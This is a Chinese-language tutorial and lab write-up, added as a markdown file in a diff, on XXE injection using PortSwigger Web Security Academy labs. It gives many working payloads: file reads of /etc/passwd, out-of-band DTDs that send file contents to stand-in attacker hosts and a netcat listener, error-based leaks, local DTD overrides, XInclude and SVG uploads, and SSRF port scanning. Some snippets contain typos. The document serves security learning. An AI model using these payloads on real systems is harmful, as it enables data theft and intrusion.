@@ -1,0 +1,520 @@
+## XXE与Portswigger Web Sec
+
+相关链接：
+
+[博客园](https://www.cnblogs.com/backlion/p/9302528.html)
+
+[安全脉搏](https://www.secpulse.com/archives/58915.html)
+
+[FreeBuf](https://www.freebuf.com/vuls/207639.html)
+
+* * *
+
+* * *
+
+XML的全称为 XML 外部实体注入，在学习的过程中发现有回显的 XXE 并不多，而大部分都是 OOB 类型的 XXE。也就是通过引用外部 dtd
+实体来获取指定的信息。
+
+    
+    
+    <!ENTITY test "hello world！"> 
+           // 内部实体
+    <!ENTITY test SYSTEM "http://123.com/123.dtd">
+           // 外部普通实体
+    <!ENTITY % test SYSTEM "http://123.com/dtd">
+           // 外部参数实体
+    %test;
+           // 在 dtd 中对外部参数实体进行引用
+    
+
+#### 攻击原理：
+
+已知 xml 可以引用外部的 dtd 文件。那么通过定义一个参数实体，再将需要读取文件的路径赋值给 前面定义的
+参数实体，就形成了任意文件的读取。如果把实体的值换成 IP+端口，那么就可能形成一个内网探测SSRF楼漏洞。而 xml 解释器在解释 xml
+的时候有两种方式，一种是一次性加载整个 xml；另一种是一部分一部分的对 xml 进行解析。如果递归的调用 xml
+定义，且数据量巨大，就有可能造成拒绝服务攻击。并且联想到我们之前学习过的 sql 注入漏洞，有些通过 xml
+传递的数据可能会被代入到数据库中进行查询，那么就有可能造成 sql注入攻击
+
+### 基础的XXE（有回显的XXE）
+
+* * *
+
+#### 1 · 直接外部 dtd
+
+    
+    
+    <!DOCTYPE test [
+    <!ENTITY killshot SYSTEM "file:///etc/passwd">
+    ]>
+    <root>
+    <test>&</test>
+    </root>
+    
+
+直接引用的话，最终的结果会在 Response 中回显
+
+#### 2 · 通过 dtd引入外部 dtd
+
+    
+    
+    <!DOCTYPE test SYSTEM "http://showmeyoushell.com/shell.dtd">
+    <root>&amptest</root>
+    
+
+#### 3 · 报错的XXE
+
+报错XXE的思路与sql注入中的报错注入类似，都是通过服务器的报错信息获取我们想要的信息
+
+###### 例如 [这里](https://www.secpulse.com/archives/58915.html)##安全脉搏##提到的
+
+    
+    
+    <!DOCTYPE test [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % killshot0 "<!ENTITY killshot1 SYSTEM 'http://admin.com.$$$$$$$/exploit/?file=%file'>">
+    ]>
+    
+
+###### 返回结果
+
+![image.png](https://image.3001.net/images/20220114/1642162577_61e1699180110af71c9cd.png!small)
+
+正是由于 xml解释器尝试解析并访问构造好的错误域名，但是由于域名错误，无法到达正确的 URL 。因此有可能会爆出错误并显示出我们想要的结果。
+
+又或者像是这样
+
+    
+    
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % killshot "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
+    %killshot;
+    %error;
+    
+
+构造一个错误的路径+正确的路径。解释器在解释 error 的时候会因为找不到正确的文件路径而报错。
+
+* * *
+
+###### XML漏洞可以间接导致很多漏洞，下图给出不同的XML解释器所支持的协议
+
+![image.png](https://image.3001.net/images/20220114/1642162590_61e1699eac0aad99ffb0d.png!small)
+
+* * *
+
+### Out-Of-Band
+
+* * *
+
+#### 1 · 直接请求服务器上的dtd
+
+通过先定义一个 参数实体 来获取指定文件的内容，再通过 引用参数实体的方式请求 外部服务器配置好的 dtd来获取指定文件的内容。
+
+如下：
+
+    
+    
+    <!DOCTYPE [
+    <!ENTITY % test1 SYSTEM "file:///etc/passwd">
+    <!ENTITY % test2 SYSTEM "http://admin.com/?tao=%test1;">
+    %test2;
+    ]>
+    
+
+正如上述，直接定义一个参数实体 test1 ，让这个参数实体通过 file:// 协议请求内部的文件，再通过应用 test2
+请求服务器，通过参数的形式获取指定的文件。
+
+但是这样并不会成功，几乎在 XML 所有的解释器中都不会解释同级参数实体的内容。
+
+###### 使用 nc：
+
+    
+    
+    服务器-dtd：
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/WINDOWS/win.ini">
+    <!ENTITY % start "<!ENTITY % send SYSTEM 'http://ip:1234/?%file;'>">
+    
+    
+    
+    Payload：
+    <!DOCTYPE Note [
+        <!ENTITY % remote SYSTEM "http://ip/exploit.dtd">
+        %remote;
+        %start;
+        %send;
+    ]>
+    
+
+最后使用nc
+
+    
+    
+    nc -lvp 1234
+    
+
+#### 2 · 嵌套请求
+
+我们直接给出 payload，并在稍后进行分析。
+
+    
+    
+    <!DOCTYPE test [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % test1 "<!ENTITY
+    % test2 SYSTEM'http://admin.com/?x=%file'
+    >">
+    ]>
+    
+
+因为是嵌套的缘故，所以参数实体中的 % 需要 ENTITY 编码转义。直接将此类代码添加在数据包中是行不通的。因为在内部 ENTITY
+中禁止应用参数实体。也正是因为这种限制，所以我们需要在服务器中添加 dtd，然后请求外部服务器的 dtd。
+
+全新的 payload：
+
+    
+    
+    xxe:
+    <!DOCTYPE test [
+        <!ENTITY % test SYSTEM "http://admin.com/test.dtd">
+     %test;
+        ]>
+    
+    
+    
+    test.dtd:
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % run1 "<!ENITTY % run2 SYSTEM 'http://dns/?x=%file'>">
+    %run1;
+    %run2;
+    
+
+在上述全新的 payload 中，我们通过 应用 %test 让有 XXE 漏洞的服务器请求如上的服务器地址。然后在test.dtd 被加载的过程中，先引用
+run1 实体，run1 实体的引用让 run2 实体得以加载，随后 将 file 参数实体的值通过参数的形式传递到 dns服务器上。
+
+#### 3 · 不允许请求外部服务器
+
+可能会存在部分主机防火墙过滤机制严格，不允许请求外部服务器的 dtd。但是我们的思路是不变的，也就是通过一个 引入一个外部的 dtd 加载修改好的实体。
+
+在操作系统中，常常会有很多自带的 dtd 文件，如下面给到的 /usr/share/yelp/dtd/docbookx.dtd 。而我们的思路就是 ：
+
+    
+    
+    重写一个内部 dtd 所含有的参数实体，通过加载内部的 dtd 起到引用重写的 dtd 的作用。
+    
+
+这里给出一个 payload：
+
+    
+    
+    <?xml version="1.0"?>
+    <!DOCTYPE message [
+        <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
+        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+        <!ENTITY % ISOamso '
+            <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
+            %eval;
+            %send;'> 
+        %remote;
+    ]>
+    <message>1234</message>
+    
+    
+    
+    上述流程：
+       定义一个参数实体 remote 且其值为内部 dtd 的路径；定义的 file 参数实体值需查看的文件路径。而参数实体 ISOamso 是内部实体文件所自带的 参数实体 ，并且我们使用三层嵌套将外部服务器的 URL 嵌套了进去（第三层的嵌套需要将 引号 也进行 ENTITY 编码）。
+    
+    由此可见在服务器端运行的大致流程如下：
+       参数实体 remote 被引用，开始加载指定路径下的系统自带 dtd 。自带的dtd加载过程中引用了重写过的 ISOamso 参数实体，便开始定义出名为 eval 的参数实体键值对。即相继调用了eval 与 send。最后在加载 send 值的同时引用 file 的值。由此 /etc/passwd 的内容便被以参数的形式发送到指定的服务器上。但貌似在读取文件的时候对于 GET 最大传参大小限制这一解决问题，本人在学习的过程中并未找到相关资料
+    
+
+* * *
+
+### Xinclude
+
+有的 web 应用程序会把用户输入的数据嵌入到后端的 XMl 里，然后再进行解析。这就意味着攻击者无法直接的控制整个 xml 文档，也无法修改 dtd 元素
+
+但是我们可以改用 xinclude 进行攻击，Xinclude 是一个 XML 的特性。其允许从子文档中构建 XML 文档，那么攻击的开始我们需要一个 标记
+xi:include
+
+    
+    
+    Payload：
+     <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+    
+
+* * *
+
+### SVG（文件上传）
+
+SVG 意为可缩放矢量图形（Scalable Vector Graphics），并且其使用 XML
+定义图像。其与主流的图片格式的区别在于如果去改变他的尺寸或者是大小其图片的质量都不会发生变化。
+
+也正是由于SVG使用 XML 定义图像，因此容易造成 XSS和XXE
+
+    
+    
+    XXE-Payload：
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE note [
+    <!ENTITY file SYSTEM "file:///etc/passwd" >
+    ]>
+    <svg height="100" width="1000">
+      <text x="10" y="20">&ampfile</text>
+    </svg>
+    
+
+hint：
+
+在有回显的情况下，如果无法回显所有的内容，可以尝试将 SVG 图像的尺寸调大
+
+##### 无回显结合SVG
+
+首先在外部服务器上放置我们构造好的 dtd 文件，然后再通过上传 SVG 文件使目标机请求外部的 dtd 文档。
+
+    
+    
+    SVG:
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE Note [ 
+    <!ENTITY lab SYSTEM "file:///etc/passwd">
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+    <!ENTITY % remote SYSTEM "http://admin.com/exploit.dtd">
+    %remote;
+    %start;
+    %send;
+    ]>
+    <svg xmlns="http://www.w3.org/2000/svg" height="200" width="200">
+            <text y="20" font-size="20">&amplab</text>
+    </svg>
+    
+    
+    
+    DTD:
+    <!ENTITY % start "<!ENTITY % send SYSTEM 'http://ip:1234/?%file;'>">
+    
+
+总而言之，SVG在XXE中也只是一个用来传输 payload 介质，除去了他是介质这一点，可以知道SVG所造成的XXE 与常规的XXE并无太大区别
+
+* * *
+
+### 靶机演练
+
+* * *
+
+#### 1 · 直接外部 dtd
+
+抓取数据包
+
+![image.png](https://image.3001.net/images/20220114/1642162616_61e169b87523617f32717.png!small)
+
+    
+    
+    payload:
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE test [
+    <!ENTITY redsun SYSTEM "file:///etc/passwd">
+    ]>
+    <stockCheck><productId>&ampredsun</productId><storeId>1</storeId></stockCheck>
+    
+
+有回显的 XXE 显示效果
+
+![image.png](https://image.3001.net/images/20220114/1642162627_61e169c3d7649484efff1.png!small)
+
+#### 2 · 通过XXE进行SSRF
+
+下图是已经修改过的数据包
+![image.png](https://image.3001.net/images/20220114/1642162639_61e169cf0e7d00a9f613d.png!small)
+
+可以通过对端口号进行遍历，观察返回数据包的情况。以此来判断内网端口的情况。
+
+而下图可见，返回为Connection refused为关闭。否则即为开启
+
+![image.png](https://image.3001.net/images/20220114/1642162652_61e169dc565984c2db758.png!small)
+
+![image.png](https://image.3001.net/images/20220114/1642162664_61e169e86c375ca42968d.png!small)
+
+![image.png](https://image.3001.net/images/20220114/1642162674_61e169f235333fafad377.png!small)
+
+#### 3 · 外带的XXE
+
+PAYLOAD：
+
+    
+    
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE test [
+    <!ENTITY tao SYSTEM "http://xmn9ezvw3u2etibn957x6bb5zw5mtb.burpcollaborator.net">
+    ]>
+    <stockCheck>
+    <productId>&amptao</productId>
+    <storeId>1</storeId>
+    </stockCheck>
+    
+
+返回的DNS信息：
+
+![image.png](https://image.3001.net/images/20220114/1642162683_61e169fbb3f6fa71a9f44.png!small)
+
+当然此处可以让其加载 外部服务器 上的 dtd 文件，而上述的dns外带简单payload 可以作为测试是否存在XXE使用
+
+======================================
+
+PS1:
+
+    
+    
+    以下的注入大部分属于盲注类型，一般的 XXE 对于信息的外带是基于 web 页面的回显。但如果 web 无回显，可以尝试使用 dns 外带（Out Of Band）的方式
+    
+
+PS2：
+
+    
+    
+    盲注的 XXE 主要设计 参数实体和内部实体。参数实体就是上面 payload 中的带有 % 的部分。而内部实体是指在一个实体内部定义另一个实体，可以理解为 实体的嵌套 。
+       但是内部实体是否有用取决于 编程语言的解释器 是否支持。
+    
+
+======================================
+
+#### 4 · 通过 XML 参数实体进行DNS带外交互的盲 XXE
+
+如果还是使用上面的 Payload 会显示：
+
+    
+    
+    Entities are not allowed for security reasons
+         // 处于安全原因不允许使用外部实体
+    
+
+那么就需要对 Payload 做出一些改动：
+
+    
+    
+    <!DOCTYPE stockCheck [
+    <!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; 
+    ]>
+      // 把原有的 dtd 实体信息改成这样
+    
+
+![image.png](https://image.3001.net/images/20220114/1642162700_61e16a0c04c33d72b3cf0.png!small)
+
+#### 5 · 通过外部的dtd获取敏感信息
+
+这一关要求我们通过让靶机访问外部的 dtd 来实现信息的外带
+
+![image.png](https://image.3001.net/images/20220114/1642162710_61e16a16c624d9061ea26.png!small)
+
+原始数据包：
+
+![image.png](https://image.3001.net/images/20220114/1642162717_61e16a1d1fcc3bf4188b2.png!small)
+
+需要一台拥有域名的服务器，并且有我们自己编写好的dtd  
+![image.png](https://image.3001.net/images/20220114/1642162725_61e16a25ec5990d5f46b5.png!small)
+
+![image.png](https://image.3001.net/images/20220114/1642162763_61e16a4bb110c99cd1723.png!small)
+
+#### 6 · 报错盲注 XXE外带
+
+这里要求我们构造报错信息，并通过报错信息显示出指定敏感文件的路径。因此我们需要在外部服务器上创建一个构造好的 dtd
+文件。并用在数据包中加入构造好的payload，用以请求外部的 dtd
+
+外部 dtd 文件：
+
+![image.png](https://image.3001.net/images/20220114/1642162773_61e16a554720289b51bfe.png!small)
+
+    
+    
+    外部dtd-Payload：
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % test "<!ENTITY % error SYSTEM 'file:///aabbccdd/%file;'>">
+    %test;
+    %error;
+    
+
+构造好的数据包：
+
+![image.png](https://image.3001.net/images/20220114/1642162782_61e16a5edd745f3642c55.png!small)
+
+    
+    
+    <!DOCTYPE dtd [
+    <!ENTITY % woo SYSTEM "https://exploit-ac031f0c1ffad6bac13c214301390046.web-security-academy.net/exploit.dtd">
+    %woo;
+    ]>
+    
+
+可以在报错信息中看到指定查看的 passwd 文件
+
+![image.png](https://image.3001.net/images/20220114/1642162792_61e16a68b7f72722cff62.png!small)
+
+#### 7 · 重写系统自带 dtd
+
+由于目标系统防火墙的限制，导致了无法请求外部服务器的 dtd。所以我们需要引用系统内部的 XXE，并重写其中的 参数实体
+
+    
+    
+    已知：
+      使用 GNOME 桌面环境的系统通常具有 DTD，其中包含一个名为/usr/share/yelp/dtd/docbookx.dtd 
+    且其中的一个参数实体名为 ISOamso
+    
+
+原始数据包：
+
+![image.png](https://image.3001.net/images/20220114/1642162805_61e16a75cd0e49463ce3f.png!small)
+
+    
+    
+    payload：
+    <!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % ISOamso '
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+    %eval;
+    %error;
+    '>
+    %local_dtd;
+    ]>
+    
+
+Response：
+
+![image.png](https://image.3001.net/images/20220114/1642162814_61e16a7e1b2d03f940c6a.png!small)
+
+#### 8 · Xinclude
+
+可以看到原始数据包中，并没有有关 xml 的信息
+
+![image.png](https://image.3001.net/images/20220114/1642162822_61e16a864ec658c4af243.png!small)
+
+那么我们来尝试一下使用 xinclude 来进行 XXE
+
+    
+    
+    Payload：
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+    
+
+可以看到在数据包中已经读取到我们定义的路径文件了
+
+![image.png](https://image.3001.net/images/20220114/1642162830_61e16a8eb5fd61c249078.png!small)
+
+#### 9 · SVG
+
+    
+    
+    Payload：
+    <?xml version="1.0" standalone="yes"?>
+    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+    <text font-size="16" x="0" y="16">&ampxxe</text></svg>
+    
+
+![image.png](https://image.3001.net/images/20220114/1642162841_61e16a991e7cfe2b5eee8.png!small)
+
+将构造好的文件上传之后再返回页面源代码中寻找靶场需要我们提交的 flag
+
+![image.png](https://image.3001.net/images/20220114/1642162849_61e16aa146c98a204a686.png!small)
+
+可以看到页面显示的评论里面有我们想要的东西
+
